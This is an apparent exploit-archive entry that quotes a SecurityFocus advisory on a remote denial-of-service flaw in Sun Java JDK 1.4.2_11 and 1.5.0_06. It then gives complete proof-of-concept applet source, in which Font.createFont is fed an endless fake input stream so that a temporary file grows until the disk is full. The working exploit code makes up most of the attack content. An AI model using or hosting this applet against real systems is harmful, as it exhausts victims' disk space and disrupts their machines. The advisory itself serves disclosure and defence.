source: http://www.securityfocus.com/bid/17981/info

Sun Java is prone to a remote denial-of-service vulnerability because the application fails to properly handle certain Java applets.

Successfully exploiting this issue will cause the application to create a temporary file that will grow in an unbounded fashion, consuming all available disk space. This will likely result in a denial-of-service condition.

Sun Java JDK 1.4.2_11 and 1.5.0_06 are vulnerable; other versions may also be affected.

import java.applet.Applet;
import java.awt.Font;
import java.io.InputStream;

class MIS extends InputStream
{

    MIS()
    {
    }

    public int read()
    {
        return 0;
    }

    public int read(byte abyte0[], int i, int j)
    {
        return j - i;
    }
}


public class FontCreatorFullDiskApplet extends Applet
{

    public FontCreatorFullDiskApplet()
    {
    }
   
    static 
    {
        try
        {
            byte abyte0[] = new byte[0];
            Font font = Font.createFont(0, new MIS());
        }
        catch(Exception exception) { }
    }
}